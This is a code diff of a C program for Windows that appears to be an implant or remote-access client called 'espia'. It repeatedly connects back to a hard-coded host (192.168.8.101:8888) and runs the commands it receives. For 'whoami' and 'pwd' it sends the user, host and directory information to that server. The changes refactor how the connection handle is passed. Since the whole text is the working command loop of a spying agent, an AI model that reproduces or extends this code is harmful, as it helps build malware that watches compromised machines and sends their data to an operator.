@@ -23,8 +23,7 @@ int main() {
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	SOCKET connection;
-	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("192.168.8.101", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
@@ -34,21 +33,21 @@ int main() {
     int cmd_size = -1;
     while (strcmp(recv_buff, "exit") && cmd_size != 0) {
         memset(recv_buff, 0, BUFF_SIZE);
-        cmd_size = espia_recv(&connection, recv_buff, BUFF_SIZE);
+        cmd_size = espia_recv(recv_buff, BUFF_SIZE);
         memset(recv_buff + cmd_size - 1, 0, 1);
 
         if (strcmp(recv_buff, "whoami") == 0) {
             WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
             memset(whoami_buff, 0, sizeof(whoami_buff));
             whoami(whoami_buff, sizeof(whoami_buff));
-            espia_send(&connection, whoami_buff, sizeof(whoami_buff));
+            espia_send(whoami_buff, sizeof(whoami_buff));
         } else if (strcmp(recv_buff, "pwd") == 0) {
             WCHAR pwd_buff[MAX_PATH + 1];
             memset(pwd_buff, 0, sizeof(pwd_buff));
             pwd(pwd_buff, sizeof(pwd_buff));
-            espia_send(&connection, pwd_buff, sizeof(pwd_buff));
+            espia_send(pwd_buff, sizeof(pwd_buff));
         } else if (strcmp(recv_buff, "ls") == 0) {
-            ls(&connection);
+            //ls(&connection);
         } else {
             printf("%s\n", recv_buff);
         }
@@ -57,7 +56,7 @@ int main() {
 
 
     /* Disconnecting from the server */
-	espia_disconnect(&connection);
+	espia_disconnect();
     /* ----------------------------- */
 
 	return 0;
